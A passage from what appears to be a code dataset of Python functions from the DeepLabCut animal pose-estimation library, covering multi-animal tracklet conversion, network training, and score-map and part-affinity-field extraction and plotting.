        If True, use training data to calibrate the animal assembly procedure.
        This improves its robustness to wrong body part links,
        but requires very little missing data.

    window_size: int, optional (default=0)
        Recurrent connections in the past `window_size` frames are
        prioritized during assembly. By default, no temporal coherence cost
        is added, and assembly is driven mainly by part affinity costs.

    identity_only: bool, optional (default=False)
        If True and animal identity was learned by the model,
        assembly and tracking rely exclusively on identity prediction.

    track_method: string, optional
         Specifies the tracker used to generate the pose estimation data.
         For multiple animals, must be either 'box', 'skeleton', or 'ellipse'
         and will be taken from the config.yaml file if none is given.


    Examples
    --------
    If you want to convert detections to tracklets:
    >>> deeplabcut.convert_detections2tracklets('/analysis/project/reaching-task/config.yaml',[]'/analysis/project/video1.mp4'], videotype='.mp4')

    If you want to convert detections to tracklets based on box_tracker:
    >>> deeplabcut.convert_detections2tracklets('/analysis/project/reaching-task/config.yaml',[]'/analysis/project/video1.mp4'], videotype='.mp4',track_method='box')

    --------

    """"""
    cfg = auxiliaryfunctions.read_config(config)
    track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    if len(cfg['multianimalbodyparts']) == 1 and track_method != 'box':
        warnings.warn('Switching to `box` tracker for single point tracking...')
        track_method = 'box'
        cfg['default_track_method'] = track_method
        auxiliaryfunctions.write_config(config, cfg)
    trainFraction = cfg['TrainingFraction'][trainingsetindex]
    start_path = os.getcwd()
    modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
    path_test_config = Path(modelfolder) / 'test' / 'pose_cfg.yaml'
    try:
        dlc_cfg = load_config(str(path_test_config))
    except FileNotFoundError:
        raise FileNotFoundError('It seems the model for shuffle %s and trainFraction %s does not exist.' % (shuffle, trainFraction))
    if 'multi-animal' not in dlc_cfg['dataset_type']:
        raise ValueError('This function is only required for multianimal projects!')
    path_inference_config = Path(modelfolder) / 'test' / 'inference_cfg.yaml'
    if inferencecfg is None:
        inferencecfg = auxfun_multianimal.read_inferencecfg(path_inference_config, cfg)
    else:
        auxfun_multianimal.check_inferencecfg_sanity(cfg, inferencecfg)
    if len(cfg['multianimalbodyparts']) == 1 and track_method != 'box':
        warnings.warn('Switching to `box` tracker for single point tracking...')
        track_method = 'box'
        inferencecfg['boundingboxslack'] = max(inferencecfg['boundingboxslack'], 40)
    try:
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(modelfolder, 'train')) if 'index' in fn])
    except FileNotFoundError:
        raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s has not been trained/does not exist.\n Please train it before using it to analyze videos.\n Use the function 'train_network' to train the network for shuffle %s."" % (shuffle, shuffle))
    if cfg['snapshotindex'] == 'all':
        print(""Snapshotindex is set to 'all' in the config.yaml file. Running video analysis with all snapshots is very costly! Use the function 'evaluate_network' to choose the best the snapshot. For now, changing snapshot index to -1!"")
        snapshotindex = -1
    else:
        snapshotindex = cfg['snapshotindex']
    increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
    Snapshots = Snapshots[increasing_indices]
    print('Using %s' % Snapshots[snapshotindex], 'for model', modelfolder)
    dlc_cfg['init_weights'] = os.path.join(modelfolder, 'train', Snapshots[snapshotindex])
    trainingsiterations = dlc_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations=trainingsiterations, modelprefix=modelprefix)
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if len(Videos) > 0:
        for video in Videos:
            print('Processing... ', video)
            videofolder = str(Path(video).parents[0])
            if destfolder is None:
                destfolder = videofolder
            auxiliaryfunctions.attempt_to_make_folder(destfolder)
            vname = Path(video).stem
            dataname = os.path.join(destfolder, vname + DLCscorer + '.h5')
            (data, metadata) = auxfun_multianimal.LoadFullMultiAnimalData(dataname)
            if track_method == 'ellipse':
                method = 'el'
            elif track_method == 'box':
                method = 'bx'
            else:
                method = 'sk'
            trackname = dataname.split('.h5')[0] + f'_{method}.pickle'
            if os.path.isfile(trackname) and (not overwrite):
                print('Tracklets already computed', trackname)
                print('Set overwrite = True to overwrite.')
            else:
                print('Analyzing', dataname)
                DLCscorer = metadata['data']['Scorer']
                all_jointnames = data['metadata']['all_joints_names']
                numjoints = len(all_jointnames)
                bodypartlabels = [bpt for (i, bpt) in enumerate(all_jointnames) for _ in range(3)]
                scorers = len(bodypartlabels) * [DLCscorer]
                xylvalue = int(len(bodypartlabels) / 3) * ['x', 'y', 'likelihood']
                pdindex = pd.MultiIndex.from_arrays(np.vstack([scorers, bodypartlabels, xylvalue]), names=['scorer', 'bodyparts', 'coords'])
                imnames = [fn for fn in data if fn != 'metadata']
                if track_method == 'box':
                    mot_tracker = trackingutils.SORTBox(inferencecfg['max_age'], inferencecfg['min_hits'], inferencecfg.get('oks_threshold', 0.3))
                elif track_method == 'skeleton':
                    mot_tracker = trackingutils.SORTSkeleton(numjoints, inferencecfg['max_age'], inferencecfg['min_hits'], inferencecfg.get('oks_threshold', 0.5))
                else:
                    mot_tracker = trackingutils.SORTEllipse(inferencecfg.get('max_age', 1), inferencecfg.get('min_hits', 1), inferencecfg.get('iou_threshold', 0.6))
                tracklets = {}
                multi_bpts = cfg['multianimalbodyparts']
                assembly_builder = inferenceutils.Assembler(data, max_n_individuals=inferencecfg['topktoretain'], n_multibodyparts=len(multi_bpts), greedy=greedy, pcutoff=inferencecfg.get('pcutoff', 0.1), min_affinity=inferencecfg.get('pafthreshold', 0.05), window_size=window_size, identity_only=identity_only)
                assemblies_filename = dataname.split('.h5')[0] + '_assemblies.pickle'
                if not os.path.exists(assemblies_filename) or overwrite:
                    if calibrate:
                        trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
                        train_data_file = os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5')
                        assembly_builder.calibrate(train_data_file)
                    assembly_builder.assemble()
                    assembly_builder.to_pickle(assemblies_filename)
                else:
                    assembly_builder.from_pickle(assemblies_filename)
                    print(f'Loading assemblies from {assemblies_filename}')
                try:
                    data.close()
                except AttributeError:
                    pass
                if cfg['uniquebodyparts']:
                    tracklets['single'] = {}
                    _single = {}
                    for (index, imname) in enumerate(imnames):
                        single_detection = assembly_builder.unique.get(index)
                        if single_detection is None:
                            continue
                        imindex = int(re.findall('\\d+', imname)[0])
                        _single[imindex] = single_detection
                    tracklets['single'].update(_single)
                if inferencecfg['topktoretain'] == 1:
                    tracklets[0] = {}
                    for (index, imname) in tqdm(enumerate(imnames)):
                        assemblies = assembly_builder.assemblies.get(index)
                        if assemblies is None:
                            continue
                        tracklets[0][imname] = assemblies[0].data
                else:
                    keep = set(multi_bpts).difference(ignore_bodyparts or [])
                    keep_inds = sorted((multi_bpts.index(bpt) for bpt in keep))
                    for (index, imname) in tqdm(enumerate(imnames)):
                        assemblies = assembly_builder.assemblies.get(index)
                        if assemblies is None:
                            continue
                        animals = np.stack([assembly_builder.data for assembly_builder in assemblies])
                        if not identity_only:
                            if track_method == 'box':
                                xy = trackingutils.calc_bboxes_from_keypoints(animals[:, keep_inds], inferencecfg['boundingboxslack'])
                            else:
                                xy = animals[:, keep_inds, :2]
                            trackers = mot_tracker.track(xy)
                        else:
                            mat = np.zeros((len(assemblies), inferencecfg['topktoretain']))
                            for (nrow, assembly) in enumerate(assemblies):
                                for (k, v) in assembly.soft_identity.items():
                                    mat[nrow, k] = v
                            inds = linear_sum_assignment(mat, maximize=True)
                            trackers = np.c_[inds][:, ::-1]
                        trackingutils.fill_tracklets(tracklets, trackers, animals, imname)
                tracklets['header'] = pdindex
                with open(trackname, 'wb') as f:
                    pickle.dump(tracklets, f, pickle.HIGHEST_PROTOCOL)
        os.chdir(str(start_path))
        print(""The tracklets were created (i.e., under the hood deeplabcut.convert_detections2tracklets was run). Now you can 'refine_tracklets' in the GUI, or run 'deeplabcut.stitch_tracklets'."")
    else:
        print('No video(s) found. Please check your path!')"
AlexEMG/DeepLabCut,return_train_network_path,"def return_train_network_path(config, shuffle=1, trainingsetindex=0, modelprefix=''):
    """"""Returns the training and test pose config file names as well as the folder where the snapshot is
    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    shuffle: int
        Integer value specifying the shuffle index to select for training.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml).

    Returns the triple: trainposeconfigfile, testposeconfigfile, snapshotfolder
    """"""
    from deeplabcut.utils import auxiliaryfunctions
    cfg = auxiliaryfunctions.read_config(config)
    modelfoldername = auxiliaryfunctions.get_model_folder(cfg['TrainingFraction'][trainingsetindex], shuffle, cfg, modelprefix=modelprefix)
    trainposeconfigfile = Path(os.path.join(cfg['project_path'], str(modelfoldername), 'train', 'pose_cfg.yaml'))
    testposeconfigfile = Path(os.path.join(cfg['project_path'], str(modelfoldername), 'test', 'pose_cfg.yaml'))
    snapshotfolder = Path(os.path.join(cfg['project_path'], str(modelfoldername), 'train'))
    return (trainposeconfigfile, testposeconfigfile, snapshotfolder)"
AlexEMG/DeepLabCut,train_network,"def train_network(config, shuffle=1, trainingsetindex=0, max_snapshots_to_keep=5, displayiters=None, saveiters=None, maxiters=None, allow_growth=True, gputouse=None, autotune=False, keepdeconvweights=True, modelprefix='', superanimal_name='', superanimal_transfer_learning=False):
    """"""Trains the network with the labels in the training dataset.

        Parameters
        ----------
        config : string
            Full path of the config.yaml file as a string.

        shuffle: int, optional, default=1
            Integer value specifying the shuffle index to select for training.

        trainingsetindex: int, optional, default=0
            Integer specifying which TrainingsetFraction to use.
            Note that TrainingFraction is a list in config.yaml.

        max_snapshots_to_keep: int or None
            Sets how many snapshots are kept, i.e. states of the trained network. Every
            saving iteration many times a snapshot is stored, however only the last
            ``max_snapshots_to_keep`` many are kept! If you change this to None, then all
            are kept.
            See: https://github.com/DeepLabCut/DeepLabCut/issues/8#issuecomment-387404835

        displayiters: optional, default=None
            This variable is actually set in ``pose_config.yaml``. However, you can
            overwrite it with this hack. Don't use this regularly, just if you are too lazy
            to dig out the ``pose_config.yaml`` file for the corresponding project. If
            ``None``, the value from there is used, otherwise it is overwritten!

        saveiters: optional, default=None
            This variable is actually set in ``pose_config.yaml``. However, you can
            overwrite it with this hack. Don't use this regularly, just if you are too lazy
            to dig out the ``pose_config.yaml`` file for the corresponding project.
            If ``None``, the value from there is used, otherwise it is overwritten!

        maxiters: optional, default=None
            This variable is actually set in ``pose_config.yaml``. However, you can
            overwrite it with this hack. Don't use this regularly, just if you are too lazy
            to dig out the ``pose_config.yaml`` file for the corresponding project.
            If ``None``, the value from there is used, otherwise it is overwritten!

        allow_growth: bool, optional, default=True.
            For some smaller GPUs the memory issues happen. If ``True``, the memory
            allocator does not pre-allocate the entire specified GPU memory region, instead
            starting small and growing as needed.
            See issue: https://forum.image.sc/t/how-to-stop-running-out-of-vram/30551/2

        gputouse: optional, default=None
            Natural number indicating the number of your GPU (see number in nvidia-smi).
            If you do not have a GPU put None.
            See: https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries

        autotune: bool, optional, default=False
            Property of TensorFlow, somehow faster if ``False``
            (as Eldar found out, see https://github.com/tensorflow/tensorflow/issues/13317).

        keepdeconvweights: bool, optional, default=True
            Also restores the weights of the deconvolution layers (and the backbone) when
            training from a snapshot. Note that if you change the number of bodyparts, you
            need to set this to false for re-training.

        modelprefix: str, optional, default=""""
            Directory containing the deeplabcut models to use when evaluating the network.
            By default, the models are assumed to exist in the project folder.

        superanimal_name: str, optional, default =""""
            Specified if transfer learning with superanimal is desired

        superanimal_transfer_learning: bool, optional, default = False.
            If set true, the training is transfer learning (new decoding layer). If set false,
    and superanimal_name is True, then the training is fine-tuning (reusing the decoding layer)

        Returns
        -------
        None

        Examples
        --------
        To train the network for first shuffle of the training dataset

        >>> deeplabcut.train_network('/analysis/project/reaching-task/config.yaml')

        To train the network for second shuffle of the training dataset

        >>> deeplabcut.train_network(
                '/analysis/project/reaching-task/config.yaml',
                shuffle=2,
                keepdeconvweights=True,
            )
    """"""
    if allow_growth:
        os.environ['TF_FORCE_GPU_ALLOW_GROWTH'] = 'true'
    import tensorflow as tf
    import importlib
    import logging
    importlib.reload(logging)
    logging.shutdown()
    from deeplabcut.utils import auxiliaryfunctions
    tf.compat.v1.reset_default_graph()
    start_path = os.getcwd()
    cfg = auxiliaryfunctions.read_config(config)
    modelfoldername = auxiliaryfunctions.get_model_folder(cfg['TrainingFraction'][trainingsetindex], shuffle, cfg, modelprefix=modelprefix)
    poseconfigfile = Path(os.path.join(cfg['project_path'], str(modelfoldername), 'train', 'pose_cfg.yaml'))
    if not poseconfigfile.is_file():
        print('The training datafile ', poseconfigfile, ' is not present.')
        print('Probably, the training dataset for this specific shuffle index was not created.')
        print(""Try with a different shuffle/trainingsetfraction or use function 'create_training_dataset' to create a new trainingdataset with this shuffle index."")
    else:
        if autotune is not False:
            os.environ['TF_CUDNN_USE_AUTOTUNE'] = '0'
        if gputouse is not None:
            os.environ['CUDA_VISIBLE_DEVICES'] = str(gputouse)
    try:
        cfg_dlc = auxiliaryfunctions.read_plainconfig(poseconfigfile)
        if superanimal_name != '':
            from deeplabcut.modelzoo.utils import parse_available_supermodels
            from dlclibrary.dlcmodelzoo.modelzoo_download import download_huggingface_model, MODELOPTIONS
            import glob
            dlc_root_path = auxiliaryfunctions.get_deeplabcut_path()
            supermodels = parse_available_supermodels()
            weight_folder = str(Path(dlc_root_path) / 'pose_estimation_tensorflow' / 'models' / 'pretrained' / (superanimal_name + '_weights'))
            if superanimal_name in MODELOPTIONS:
                if not os.path.exists(weight_folder):
                    download_huggingface_model(superanimal_name, weight_folder)
                else:
                    print(f'{weight_folder} exists, using the downloaded weights')
            else:
                print(f'{superanimal_name} not available. Available ones are: ', MODELOPTIONS)
            snapshots = glob.glob(os.path.join(weight_folder, 'snapshot-*.index'))
            init_weights = os.path.abspath(snapshots[0]).replace('.index', '')
            from deeplabcut.pose_estimation_tensorflow.core.train_multianimal import train
            print('Selecting multi-animal trainer')
            train(str(poseconfigfile), displayiters, saveiters, maxiters, max_to_keep=max_snapshots_to_keep, keepdeconvweights=keepdeconvweights, allow_growth=allow_growth, init_weights=init_weights, remove_head=True if superanimal_name != '' and superanimal_transfer_learning else False)
        elif 'multi-animal' in cfg_dlc['dataset_type']:
            from deeplabcut.pose_estimation_tensorflow.core.train_multianimal import train
            print('Selecting multi-animal trainer')
            train(str(poseconfigfile), displayiters, saveiters, maxiters, max_to_keep=max_snapshots_to_keep, keepdeconvweights=keepdeconvweights, allow_growth=allow_growth)
        else:
            from deeplabcut.pose_estimation_tensorflow.core.train import train
            print('Selecting single-animal trainer')
            train(str(poseconfigfile), displayiters, saveiters, maxiters, max_to_keep=max_snapshots_to_keep, keepdeconvweights=keepdeconvweights, allow_growth=allow_growth)
    except BaseException as e:
        raise e
    finally:
        os.chdir(str(start_path))
    print(""The network is now trained and ready to evaluate. Use the function 'evaluate_network' to evaluate the network."")"
AlexEMG/DeepLabCut,display_dataset,"def display_dataset():
    logging.basicConfig(level=logging.DEBUG)
    cfg = load_config()
    dataset = PoseDatasetFactory.create(cfg)
    dataset.set_shuffle(False)
    while True:
        batch = dataset.next_batch()
        for frame_id in range(1):
            img = batch[Batch.inputs][frame_id, :, :, :]
            img = np.squeeze(img).astype('uint8')
            scmap = batch[Batch.part_score_targets][frame_id, :, :, :]
            scmap = np.squeeze(scmap)
            subplot_height = 4
            subplot_width = 5
            num_plots = subplot_width * subplot_height
            (f, axarr) = plt.subplots(subplot_height, subplot_width)
            for j in range(num_plots):
                plot_j = j // subplot_width
                plot_i = j % subplot_width
                curr_plot = axarr[plot_j, plot_i]
                curr_plot.axis('off')
                if j >= cfg['num_joints']:
                    continue
                scmap_part = scmap[:, :, j]
                scmap_part = imresize(scmap_part, 8.0, interpolationmethod=cv2.INTER_NEAREST)
                scmap_part = np.lib.pad(scmap_part, ((4, 0), (4, 0)), 'minimum')
                curr_plot.set_title('{}'.format(j + 1))
                curr_plot.imshow(img)
                curr_plot.hold(True)
                curr_plot.imshow(scmap_part, alpha=0.5)
        plt.show()
        plt.waitforbuttonpress()"
AlexEMG/DeepLabCut,extract_maps,"def extract_maps(config, shuffle=0, trainingsetindex=0, gputouse=None, rescale=False, Indices=None, modelprefix=''):
    """"""
    Extracts the scoremap, locref, partaffinityfields (if available).

    Returns a dictionary indexed by: trainingsetfraction, snapshotindex, and imageindex
    for those keys, each item contains: (image,scmap,locref,paf,bpt names,partaffinity graph, imagename, True/False if this image was in trainingset)
    ----------
    config : string
        Full path of the config.yaml file as a string.

    shuffle: integer
        integers specifying shuffle index of the training dataset. The default is 0.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml). This
        variable can also be set to ""all"".

    rescale: bool, default False
        Evaluate the model at the 'global_scale' variable (as set in the test/pose_config.yaml file for a particular project). I.e. every
        image will be resized according to that scale and prediction will be compared to the resized ground truth. The error will be reported
        in pixels at rescaled to the *original* size. I.e. For a [200,200] pixel image evaluated at global_scale=.5, the predictions are calculated
        on [100,100] pixel images, compared to 1/2*ground truth and this error is then multiplied by 2!. The evaluation images are also shown for the
        original size!

    Examples
    --------
    If you want to extract the data for image 0 and 103 (of the training set) for model trained with shuffle 0.
    >>> deeplabcut.extract_maps(configfile,0,Indices=[0,103])

    """"""
    from deeplabcut.utils.auxfun_videos import imread, imresize
    from deeplabcut.pose_estimation_tensorflow.core import predict, predict_multianimal as predictma
    from deeplabcut.pose_estimation_tensorflow.config import load_config
    from deeplabcut.pose_estimation_tensorflow.datasets.utils import data_to_input
    from deeplabcut.utils import auxiliaryfunctions
    from tqdm import tqdm
    import tensorflow as tf
    import pandas as pd
    from pathlib import Path
    import numpy as np
    tf.compat.v1.reset_default_graph()
    os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'
    start_path = os.getcwd()
    cfg = auxiliaryfunctions.read_config(config)
    if gputouse is not None:
        os.environ['CUDA_VISIBLE_DEVICES'] = str(gputouse)
    if trainingsetindex == 'all':
        TrainingFractions = cfg['TrainingFraction']
    elif trainingsetindex < len(cfg['TrainingFraction']) and trainingsetindex >= 0:
        TrainingFractions = [cfg['TrainingFraction'][int(trainingsetindex)]]
    else:
        raise Exception('Please check the trainingsetindex! ', trainingsetindex, ' should be an integer from 0 .. ', int(len(cfg['TrainingFraction']) - 1))
    trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
    Data = pd.read_hdf(os.path.join(cfg['project_path'], str(trainingsetfolder), 'CollectedData_' + cfg['scorer'] + '.h5'))
    auxiliaryfunctions.attempt_to_make_folder(str(cfg['project_path'] + '/evaluation-results/'))
    Maps = {}
    for trainFraction in TrainingFractions:
        Maps[trainFraction] = {}
        (datafn, metadatafn) = auxiliaryfunctions.get_data_and_metadata_filenames(trainingsetfolder, trainFraction, shuffle, cfg)
        modelfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
        path_test_config = Path(modelfolder) / 'test' / 'pose_cfg.yaml'
        (data, trainIndices, testIndices, trainFraction) = auxiliaryfunctions.load_metadata(os.path.join(cfg['project_path'], metadatafn))
        try:
            dlc_cfg = load_config(str(path_test_config))
        except FileNotFoundError:
            raise FileNotFoundError('It seems the model for shuffle %s and trainFraction %s does not exist.' % (shuffle, trainFraction))
        dlc_cfg['batch_size'] = 1
        evaluationfolder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_evaluation_folder(trainFraction, shuffle, cfg, modelprefix=modelprefix)))
        auxiliaryfunctions.attempt_to_make_folder(evaluationfolder, recursive=True)
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(str(modelfolder), 'train')) if 'index' in fn])
        try:
            Snapshots[0]
        except IndexError:
            raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s and trainFraction %s is not trained.\nPlease train it before evaluating.\nUse the function 'train_network' to do so."" % (shuffle, trainFraction))
        increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
        Snapshots = Snapshots[increasing_indices]
        if cfg['snapshotindex'] == -1:
            snapindices = [-1]
        elif cfg['snapshotindex'] == 'all':
            snapindices = range(len(Snapshots))
        elif cfg['snapshotindex'] < len(Snapshots):
            snapindices = [cfg['snapshotindex']]
        else:
            print('Invalid choice, only -1 (last), any integer up to last, or all (as string)!')
        scale = dlc_cfg['global_scale'] if rescale else 1
        Data *= scale
        bptnames = [dlc_cfg['all_joints_names'][i] for i in range(len(dlc_cfg['all_joints']))]
        for snapindex in snapindices:
            dlc_cfg['init_weights'] = os.path.join(str(modelfolder), 'train', Snapshots[snapindex])
            trainingsiterations = dlc_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
            (sess, inputs, outputs) = predict.setup_pose_prediction(dlc_cfg)
            Numimages = len(Data.index)
            PredicteData = np.zeros((Numimages, 3 * len(dlc_cfg['all_joints_names'])))
            print('Analyzing data...')
            if Indices is None:
                Indices = enumerate(Data.index)
            else:
                Ind = [Data.index[j] for j in Indices]
                Indices = enumerate(Ind)
            DATA = {}
            for (imageindex, imagename) in tqdm(Indices):
                image = imread(os.path.join(cfg['project_path'], *imagename), mode='skimage')
                if scale != 1:
                    image = imresize(image, scale)
                image_batch = data_to_input(image)
                outputs_np = sess.run(outputs, feed_dict={inputs: image_batch})
                if cfg.get('multianimalproject', False):
                    (scmap, locref, paf) = predictma.extract_cnn_output(outputs_np, dlc_cfg)
                    pagraph = dlc_cfg['partaffinityfield_graph']
                else:
                    (scmap, locref) = predict.extract_cnn_output(outputs_np, dlc_cfg)
                    paf = None
                    pagraph = []
                peaks = outputs_np[-1]
                if imageindex in testIndices:
                    trainingfram = False
                else:
                    trainingfram = True
                DATA[imageindex] = [image, scmap, locref, paf, peaks, bptnames, pagraph, imagename, trainingfram]
            Maps[trainFraction][Snapshots[snapindex]] = DATA
    os.chdir(str(start_path))
    return Maps"
AlexEMG/DeepLabCut,resize_to_same_shape,"def resize_to_same_shape(array, array_dest):
    shape_dest = array_dest.shape
    return resize(array, (shape_dest[0], shape_dest[1]))"
AlexEMG/DeepLabCut,resize_all_maps,"def resize_all_maps(image, scmap, locref, paf):
    scmap = resize_to_same_shape(scmap, image)
    locref_x = resize_to_same_shape(locref[:, :, :, 0], image)
    locref_y = resize_to_same_shape(locref[:, :, :, 1], image)
    if paf is not None:
        paf = resize_to_same_shape(paf, image)
    return (scmap, (locref_x, locref_y), paf)"
AlexEMG/DeepLabCut,form_figure,"def form_figure(nx, ny):
    (fig, ax) = plt.subplots(frameon=False)
    ax.set_xlim(0, nx)
    ax.set_ylim(0, ny)
    ax.axis('off')
    ax.invert_yaxis()
    fig.tight_layout()
    return (fig, ax)"
AlexEMG/DeepLabCut,visualize_scoremaps,"def visualize_scoremaps(image, scmap):
    (ny, nx) = np.shape(image)[:2]
    (fig, ax) = form_figure(nx, ny)
    ax.imshow(image)
    ax.imshow(scmap, alpha=0.5)
    return (fig, ax)"
AlexEMG/DeepLabCut,visualize_locrefs,"def visualize_locrefs(image, scmap, locref_x, locref_y, step=5, zoom_width=0):
    (fig, ax) = visualize_scoremaps(image, scmap)
    (X, Y) = np.meshgrid(np.arange(locref_x.shape[1]), np.arange(locref_x.shape[0]))
    M = np.zeros(locref_x.shape, dtype=bool)
    M[scmap < 0.5] = True
    U = np.ma.masked_array(locref_x, mask=M)
    V = np.ma.masked_array(locref_y, mask=M)
    ax.quiver(X[::step, ::step], Y[::step, ::step], U[::step, ::step], V[::step, ::step], color='r', units='x', scale_units='xy', scale=1, angles='xy')
    if zoom_width > 0:
        maxloc = np.unravel_index(np.argmax(scmap), scmap.shape)
        ax.set_xlim(maxloc[1] - zoom_width, maxloc[1] + zoom_width)
        ax.set_ylim(maxloc[0] + zoom_width, maxloc[0] - zoom_width)
    return (fig, ax)"
AlexEMG/DeepLabCut,visualize_paf,"def visualize_paf(image, paf, step=5, colors=None):
    (ny, nx) = np.shape(image)[:2]
    (fig, ax) = form_figure(nx, ny)
    ax.imshow(image)
    n_fields = paf.shape[2]
    if colors is None:
        colors = ['r'] * n_fields
    for n in range(n_fields):
        U = paf[:, :, n, 0]
        V = paf[:, :, n, 1]
        (X, Y) = np.meshgrid(np.arange(U.shape[1]), np.arange(U.shape[0]))
        M = np.zeros(U.shape, dtype=bool)
        M[U ** 2 + V ** 2 < 0.5 * 0.5 ** 2] = True
        U = np.ma.masked_array(U, mask=M)
        V = np.ma.masked_array(V, mask=M)
        ax.quiver(X[::step, ::step], Y[::step, ::step], U[::step, ::step], V[::step, ::step], scale=50, headaxislength=4, alpha=1, width=0.002, color=colors[n], angles='xy')
    return (fig, ax)"
AlexEMG/DeepLabCut,_save_individual_subplots,"def _save_individual_subplots(fig, axes, labels, output_path):
    for (ax, label) in zip(axes, labels):
        extent = ax.get_tightbbox(fig.canvas.renderer).transformed(fig.dpi_scale_trans.inverted())
        fig.savefig(output_path.format(bp=label), bbox_inches=extent)"
AlexEMG/DeepLabCut,extract_save_all_maps,"def extract_save_all_maps(config, shuffle=1, trainingsetindex=0, comparisonbodyparts='all', extract_paf=True, all_paf_in_one=True, gputouse=None, rescale=False, Indices=None, modelprefix='', dest_folder=None):
    """"""
    Extracts the scoremap, location refinement field and part affinity field prediction of the model. The maps
    will be rescaled to the size of the input image and stored in the corresponding model folder in /evaluation-results.

    ----------
    config : string
        Full path of the config.yaml file as a string.

    shuffle: integer
        integers specifying shuffle index of the training dataset. The default is 1.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml). This
        variable can also be set to ""all"".

    comparisonbodyparts: list of bodyparts, Default is ""all"".
        The average error will be computed for those body parts only (Has to be a subset of the body parts).

    extract_paf : bool
        Extract part affinity fields by default.
        Note that turning it off will make the function much faster.

    all_paf_in_one : bool
        By default, all part affinity fields are displayed on a single frame.
        If false, individual fields are shown on separate frames.

    Indices: default None
        For which images shall the scmap/locref and paf be computed? Give a list of images

    nplots_per_row: int, optional (default=None)
        Number of plots per row in grid plots. By default, calculated to approximate a squared grid of plots

    Examples
    --------
    Calculated maps for images 0, 1 and 33.
    >>> deeplabcut.extract_save_all_maps('/analysis/project/reaching-task/config.yaml', shuffle=1,Indices=[0,1,33])

    """"""
    from deeplabcut.utils.auxiliaryfunctions import read_config, attempt_to_make_folder, get_evaluation_folder, intersection_of_body_parts_and_ones_given_by_user
    from tqdm import tqdm
    cfg = read_config(config)
    data = extract_maps(config, shuffle, trainingsetindex, gputouse, rescale, Indices, modelprefix)
    comparisonbodyparts = intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts)
    print('Saving plots...')
    for (frac, values) in data.items():
        if not dest_folder:
            dest_folder = os.path.join(cfg['project_path'], str(get_evaluation_folder(frac, shuffle, cfg, modelprefix=modelprefix)), 'maps')
        attempt_to_make_folder(dest_folder)
        filepath = '{imname}_{map}_{label}_{shuffle}_{frac}_{snap}.png'
        dest_path = os.path.join(dest_folder, filepath)
        for (snap, maps) in values.items():
            for imagenr in tqdm(maps):
                (image, scmap, locref, paf, peaks, bptnames, pafgraph, impath, trainingframe) = maps[imagenr]
                if not extract_paf:
                    paf = None
                label = 'train' if trainingframe else 'test'
                imname = impath[-1]
                (scmap, (locref_x, locref_y), paf) = resize_all_maps(image, scmap, locref, paf)
                to_plot = [i for (i, bpt) in enumerate(bptnames) if bpt in comparisonbodyparts]
                list_of_inds = []
                for (n, edge) in enumerate(pafgraph):
                    if any((ind in to_plot for ind in edge)):
                        list_of_inds.append([(2 * n, 2 * n + 1), (bptnames[edge[0]], bptnames[edge[1]])])
                if len(to_plot) > 1:
                    map_ = scmap[:, :, to_plot].sum(axis=2)
                    locref_x_ = locref_x[:, :, to_plot].sum(axis=2)
                    locref_y_ = locref_y[:, :, to_plot].sum(axis=2)
                elif len(to_plot) == 1 and len(bptnames) > 1:
                    map_ = scmap[:, :, to_plot]
                    locref_x_ = locref_x[:, :, to_plot]
                    locref_y_ = locref_y[:, :, to_plot]
                else:
                    map_ = scmap[..., 0]
                    locref_x_ = locref_x[..., 0]
                    locref_y_ = locref_y[..., 0]
                (fig1, _) = visualize_scoremaps(image, map_)
                temp = dest_path.format(imname=imname, map='scmap', label=label, shuffle=shuffle, frac=frac, snap=snap)
                fig1.savefig(temp)
                (fig2, _) = visualize_locrefs(image, map_, locref_x_, locref_y_)
                temp = dest_path.format(imname=imname, map='locref', label=label, shuffle=shuffle, frac=frac, snap=snap)
                fig2.savefig(temp)
                if paf is not None:
                    if not all_paf_in_one:
                        for (inds, names) in list_of_inds:
                            (fig3, _) = visualize_paf(image, paf[:, :, [inds]])
                            temp = dest_path.format(imname=imname, map=f""paf_{'_'.join(names)}"", label=label, shuffle=shuffle, frac=frac, snap=snap)
                            fig3.savefig(temp)
                    else:
                        inds = [elem[0] for elem in list_of_inds]
                        n_inds = len(inds)
                        cmap = plt.cm.get_cmap(cfg['colormap'], n_inds)
                        colors = cmap(range(n_inds))
                        (fig3, _) = visualize_paf(image, paf[:, :, inds], colors=colors)
                        temp = dest_path.format(imname=imname, map=f'paf', label=label, shuffle=shuffle, frac=frac, snap=snap)
                        fig3.savefig(temp)
                plt.close('all')"
AlexEMG/DeepLabCut,transformer_reID,"def transformer_reID(config, videos, videotype='', shuffle=1, trainingsetindex=0, track_method='ellipse', n_tracks=None, n_triplets=1000, train_epochs=100, train_frac=0.8, modelprefix='', destfolder=None):
    """"""
    Enables tracking with transformer.

    Substeps include:

    - Mines triplets from tracklets in videos (from another tracker)
